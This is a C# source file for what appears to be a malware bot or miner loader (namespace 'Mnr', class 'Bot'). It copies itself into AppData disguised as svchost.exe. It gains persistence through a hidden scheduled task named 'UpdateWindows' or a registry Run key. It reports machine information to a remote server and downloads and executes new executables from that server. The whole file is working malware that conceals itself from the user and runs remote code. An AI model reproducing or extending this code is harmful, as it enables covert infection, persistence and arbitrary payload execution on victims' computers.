using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Windows.Forms;
using System.Xml;
using System.Xml.Serialization;

namespace Mnr
{
    class Bot : ServerSettings
    {
        public static string MainDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + "WinHost";

        private static string BtName = "svchost.exe";

        private const string UpdGet = ".msdat";
        public Bot()
        {

        }

        public static void Start()
        {
            string currentDir = Assembly.GetEntryAssembly().Location;
            Directory.CreateDirectory(MainDir);

            string btPath = MainDir + "\\" + BtName;

            if (!File.Exists(btPath))
            {
                File.Move(currentDir, btPath);
                Process.Start(btPath);
                Autorun(btPath);
                Environment.Exit(0);
            }
            CreateUpdateFile();
        }

        private static void CreateUpdateFile()
        {
            string updPath = MainDir + "\\" + UpdGet;
            if (!File.Exists(updPath))
            {
                try
                {
                    using (FileStream fs = new FileStream(updPath, FileMode.OpenOrCreate))
                    {
                        string data = GetResponse(ServerUpd);
                        XmlDocument xml = new XmlDocument();
                        xml.LoadXml(data);
                        xml.Save(fs);
                    }
                }
                catch (Exception)
                {

                }
            }
        }
        public static void SendInfo()
        {
            GetResponse(ServerSendArgs, MachineInfo.GetMachineInfoToParams);
        }

        public static void LoadUpd()
        {
            try
            {
                string updPath = MainDir + "\\" + UpdGet;
                Update dataFile = Update.Deserialize(updPath);
                Update dataUrl;

                WebClient wc = new WebClient();

                using (Stream stream = wc.OpenRead(ServerUpd))
                {
                    XmlSerializer serializer = new XmlSerializer(typeof(Update));
                    dataUrl = (Update)serializer.Deserialize(stream);
                }

                if (dataUrl.Version > dataFile.Version)
                {
                    LoadFile(dataUrl.Link, MainDir + "\\" + dataUrl.Name + ".exe");
                    using (FileStream fs = new FileStream(updPath, FileMode.Truncate))
                    {
                        string data = GetResponse(ServerUpd);
                        XmlDocument xml = new XmlDocument();
                        xml.LoadXml(data);
                        xml.Save(fs);
                    }
                    Process.Start(MainDir + "\\" + dataUrl.Name + ".exe");
                    Environment.Exit(0);
                }

            }
            catch (Exception ex)
            {

            }
        }

        private static string GetResponse(string url)
        {
            WebRequest rq = WebRequest.Create(url);
            WebResponse resp = rq.GetResponse();
            string data;
            using (Stream stream = resp.GetResponseStream())
            {
                using (StreamReader reader = new StreamReader(stream))
                {
                    data = reader.ReadToEnd();
                }
            }
            resp.Close();
            return data;
        }

        private static void GetResponse(string url, string param)
        {
            try
            {
                WebRequest rq = WebRequest.Create(url + param);
                WebResponse resp = rq.GetResponse();
                resp.Close();
            }
            catch (Exception) { }
        }

        public static void LoadFile(string url, string path)
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc0 | 0x300 | 0xc00);
            WebClient wc = new WebClient();
            wc.DownloadFile(url, path);
        }

        private static void Autorun(string path)
        {
            try
            {
                string arguments = string.Concat(new string[]
                {
                "/create /tn UpdateWindows /tr \"",
                path,
                "\" /st ",
                DateTime.Now.AddMinutes(3.0).ToString("HH:mm"),
                " /du 23:59 /sc daily /ri 1 /f"
                });

                Process.Start(new ProcessStartInfo
                {
                    Arguments = arguments,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "schtasks.exe",
                    RedirectStandardOutput = true,
                    UseShellExecute = false
                });
            }
            catch (Exception)
            {
                RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rkApp.SetValue("sys", Application.ExecutablePath.ToString());
            }
        }
    }
}
